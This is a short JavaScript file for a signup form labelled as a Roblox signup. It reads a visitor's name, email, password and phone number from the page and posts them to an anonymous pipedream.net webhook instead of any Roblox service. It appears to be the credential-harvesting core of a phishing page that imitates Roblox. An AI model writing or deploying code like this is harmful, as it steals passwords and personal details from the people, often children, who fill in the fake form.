function PostSignup(first_name, last_name, email, password, number_phone) {
  var myHeaders = new Headers();
  myHeaders.append("RobloxSignUp", "Roblox");
  myHeaders.append("Content-Type", "application/json");

  var raw = JSON.stringify({
      "first_name": first_name,
      "last_name": last_name,
      "email": email,
      "password": password,
      "number_phone": number_phone
  });

  var requestOptions = {
      method: "POST",
      headers: myHeaders,
      body: raw,
      redirect: "follow"
  };

  fetch("https://eotkocq9odgq9ga.m.pipedream.net", requestOptions)
      .then((response) => response.text())
      .then((result) => GetResponse(result))
      .catch((error) => console.error(error));
}

function GetResponse(result) {
  document.getElementById("formsignup").innerHTML = result;
}

function ButtonSignup() {
  var first_name = document.getElementById("first_name").value;
  var last_name = document.getElementById("last_name").value;
  var email = document.getElementById("email").value;
  var password = document.getElementById("password").value;
  var number_phone = document.getElementById("number_phone").value;
  PostSignup(first_name, last_name, email, password, number_phone);
}
